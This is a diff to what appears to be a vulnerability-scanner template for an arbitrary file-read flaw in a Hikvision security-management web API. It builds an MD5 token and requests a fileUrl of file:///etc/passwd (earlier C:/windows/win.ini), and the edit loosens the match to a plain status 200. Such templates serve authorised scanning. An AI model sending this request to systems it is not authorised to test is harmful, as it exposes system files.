@@ -15,13 +15,13 @@ info:
   created: 2023/06/25
 
 set:
-  token: md5(request.url.scheme+"://"+request.url.host+"/eps/api/triggerSnapshot/download")
+  token: toUpper(md5(request.url.scheme+"://"+request.url.host+"/eps/api/resourceOperations/uploadsecretKeyIbuilding"))
 rules:
   r0:
     request:
       method: GET
       headers:
         Cookie: ISMS_8700_Sessionname=ABCB193BD9D82CC2D6094F6ED4D81169
-      path: /eps/api/triggerSnapshot/download?token={{token}}&fileUrl=file:///C:/windows/win.ini&fileName=1
-    expression: response.status == 200  && response.body.bcontains(b"for 16-bit app support")
+      path: /eps/api/triggerSnapshot/download?token={{token}}&fileUrl=file:///etc/passwd&fileName=1
+    expression: response.status == 200
 expression: r0()
